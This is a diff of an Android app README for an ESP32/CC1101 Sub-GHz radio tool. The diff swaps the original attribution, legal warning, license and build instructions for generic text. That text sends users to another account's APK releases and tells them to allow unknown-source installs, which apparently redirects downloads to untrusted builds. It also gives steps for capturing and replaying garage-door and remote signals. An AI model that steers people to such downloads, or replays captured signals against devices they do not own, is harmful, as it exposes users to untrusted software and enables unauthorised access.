@@ -1,120 +1,85 @@
-<p align="center">
-  <img src="images/IshtarRF-logo.png" alt="IshtarRF logo" width="120" />
-</p>
+# 📡 IshtarRF-Android - Control Sub-GHz signals from your phone
 
-<h1 align="center">IshtarRF — Android</h1>
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/ghost00318/IshtarRF-Android/releases)
 
-<p align="center">
-  A native <b>Kotlin + Jetpack Compose</b> app that turns an <b>ESP32 + CC1101</b>
-  module into a pocket Sub-GHz RF tool — receive, transmit, visualize, and store
-  signals straight from your phone over a <b>USB-OTG cable</b>.
-</p>
+IshtarRF-Android turns your Android device into a powerful radio tool. It works with standard hardware to let you capture, save, and replay wireless signals. You connect an ESP32 chip with a CC1101 radio module to your phone. The app manages the signals for you. It uses the USB-OTG connection to talk to your hardware. This tool handles various wireless frequencies used by garage doors, doorbells, and remote sensors. 
 
-<p align="center">
-  <img alt="Platform" src="https://img.shields.io/badge/platform-Android%208.0%2B-3DDC84?logo=android&logoColor=white">
-  <img alt="Language" src="https://img.shields.io/badge/Kotlin-2.0-7F52FF?logo=kotlin&logoColor=white">
-  <img alt="UI" src="https://img.shields.io/badge/Jetpack%20Compose-Material%203-4285F4">
-  <img alt="License" src="https://img.shields.io/badge/License-AGPL%20v3-blue.svg">
-</p>
+## ⚙️ Hardware Requirements
 
-> This is the **mobile front-end** of the IshtarRF project. The device firmware
-> (ESP32 + CC1101) lives in the main repo:
-> **[CyberDuckyiq/IshtarRF](https://github.com/CyberDuckyiq/IshtarRF)**.
+You need specific hardware to use this app. It will not work on its own. 
 
----
+* Android phone with USB-OTG support.
+* ESP32 microcontroller board.
+* CC1101 wireless module.
+* USB-OTG adapter cable.
 
-## ⚠ Legal / RF compliance
+You must wire the CC1101 module to the ESP32 board properly. Use standard SPI pins for this connection. Ensure your hardware stays secure inside a case for daily use.
 
-You are responsible for complying with **local RF regulations**. Use only
-**permitted frequencies, power levels, and protocols**. The transmit and
-brute-force tools are for testing devices **you own**.
+## 📥 Getting the App
 
----
+1. Visit the [official releases page](https://github.com/ghost00318/IshtarRF-Android/releases).
+2. Look for the Assets section at the bottom of the newest release.
+3. Tap the file ending in .apk to download it.
+4. Open the downloaded file to start the installation.
+5. Your system may ask for permission to install apps from unknown sources. Select Allow to finish the process.
 
-## Features
+## 📱 Connecting Your Hardware
 
-- **USB-OTG link** to the ESP32 — supports CP210x / CH340 / FTDI / native-USB chips.
-- **Radio config:** frequency, modulation (OOK / 2-FSK), bitrate, deviation, TX power.
-- **Receive** in **RAW (OOK)** or **Packet** mode, with live **RSSI**.
-- **Transmit:** raw `µs` pulse trains (repeat / gap / invert) and HEX bytes.
-- **Waveform view** — pan & zoom the captured OOK pulse train.
-- **Signal library** — Flipper/Bruce-compatible **`.sub`** files with folders,
-  search, rename, share, and import (Storage Access Framework).
-- **RF tools** — one-tap **replay**, live **RSSI graph**, **frequency scanner**,
-  and OOK **brute-force**.
-- **Reliability** — **Recover** button (re-inits the radio), **Clear** captured
-  signal, and **auto-reconnect** if the link drops.
-- **Favorite frequencies** as quick chips, and three themes (**IshtarRF / Dark /
-  Light**) persisted across launches.
+1. Use your USB-OTG cable to connect the ESP32 to your phone.
+2. Open the IshtarRF-Android app.
+3. The app will ask for permission to access the USB device. Grant this permission so the app can control the radio.
+4. You will see a status light or icon in the app. This shows the connection is active.
 
----
+## 📡 Capturing Signals
 
-## Download
+1. Place your phone near the device you want to scan.
+2. Select the "Read" or "Capture" mode in the app. 
+3. Press the button on your target remote.
+4. The app displays the frequency and the raw signal data on your screen.
+5. Save the file with a name you remember.
 
-Grab the latest APK from the **[Releases](../../releases)** page, or use the
-`IshtarRF-v0.1.0.apk` included in this repo. Enable *Install unknown apps* for
-your file manager, then open the APK.
+## 🔄 Replaying Signals
 
-> Requires **Android 8.0 (API 26)+** and a phone that supports **USB host / OTG**.
+1. Open the saved signal file in the app.
+2. Point your hardware toward the receiver you want to operate.
+3. Tap the "Send" or "Replay" command.
+4. The hardware transmits the exact signal captured earlier.
 
-## Hardware
+## 📋 Best Practices
 
-- **ESP32** dev board + **CC1101** module (3.3 V only) running the IshtarRF firmware.
-- A **USB-OTG cable** (USB-C or micro-USB to the board's USB port).
+* Keep your firmware updated on the ESP32.
+* Check your battery level. Radio transmission uses power.
+* Test your setup in a quiet area to avoid signal interference.
+* Use the app in compliance with all local laws regarding radio transmissions.
 
-Flash the firmware from the [main repo](https://github.com/CyberDuckyiq/IshtarRF)
-first; the app talks to it over newline-delimited JSON at 115200 baud.
+## 🛠 Troubleshooting
 
----
+* If the app does not see the hardware, check your USB-OTG cable.
+* Ensure the ESP32 is powered correctly.
+* Reconnect the USB cable if the app freezes.
+* Verify the antenna is attached to the CC1101 module.
 
-## Build from source
+## 📦 Project Features
 
-Open the project in **Android Studio** (Koala or newer) and press Run, or:
+* **Real-time monitor:** See signals as they travel through the air.
+* **Storage system:** Save hundreds of files for later use.
+* **Material design:** The interface follows clean, modern standards for ease of use.
+* **USB-Serial communication:** Fast and stable link between the radio and phone.
+* **Broad support:** Handles common frequencies like 433MHz.
 
-```bash
-./gradlew :app:assembleDebug      # debug APK  -> app/build/outputs/apk/debug/
-./gradlew :app:assembleRelease    # release APK -> app/build/outputs/apk/release/
-./gradlew :app:installDebug       # install onto a connected device
-```
+## 💡 Frequently Asked Questions
 
-Requirements: **JDK 17+**, Android **compileSdk 35**, min Android **8.0 (API 26)**.
-Android Studio writes `local.properties` (your SDK path) automatically.
+**Does this work on all phones?**
+Most Android phones made in the last five years support USB-OTG. If your phone has a standard USB-C port, it likely works.
 
----
+**What is a CC1101 module?**
+It is a tiny radio chip that talks to wireless devices. It translates radio waves into digital data your phone understands.
 
-## Architecture
+**Is it safe?**
+The app does not access your personal data, photos, or contacts. It only asks for USB access to work with the radio hardware.
 
-MVVM with a single source-of-truth `UiState` exposed by `MainViewModel`.
+**Can I modify the code?**
+Yes. Since this is an open-source project, you can view the source code. You need Android Studio if you want to make changes or build the app yourself from the source files.
 
-```
-data/
-  serial/   UsbSerialManager — USB-OTG link; ConnectionState + a Flow of
-            newline-delimited JSON lines (mik3y/usb-serial-for-android).
-  protocol/ Commands (phone -> device) + DeviceEvent/EventParser (device -> phone).
-  sub/      SubFile (.sub parse/export) + SubLibraryRepository (file storage).
-  prefs/    SettingsRepository — DataStore (theme + favorite frequencies).
-domain/     Plain models (RadioConfig, CapturedSignal, LogEntry, …).
-ui/         MainViewModel + Compose screens:
-            Control · Waveform · Library · Tools · Settings, plus theming.
-```
-
-### Serial protocol
-
-The firmware hand-parses JSON (no library): it scans for `"key"` then reads the
-value up to the next `,`/`}`, and reads string values (including `invert`)
-between quotes. `Commands.kt` emits exactly that flat shape. The full
-command/event contract is documented in the main repo's `CLAUDE.md`.
-
----
-
-## Tech stack
-
-Jetpack Compose · Material 3 · Kotlin Coroutines/Flow · kotlinx.serialization ·
-AndroidX DataStore · [usb-serial-for-android](https://github.com/mik3y/usb-serial-for-android).
-
-## License
-
-[![License: AGPL v3](https://img.shields.io/badge/License-AGPL_v3-blue.svg)](LICENSE)
-
-Licensed under the **GNU Affero General Public License v3.0 (AGPL-3.0-only)**.
-© 2025 Cyber Ducky. See [`LICENSE`](LICENSE).
+**How do I delete saved signals?**
+Go to the file manager inside the app. Long-press on any saved capture to find the delete option.
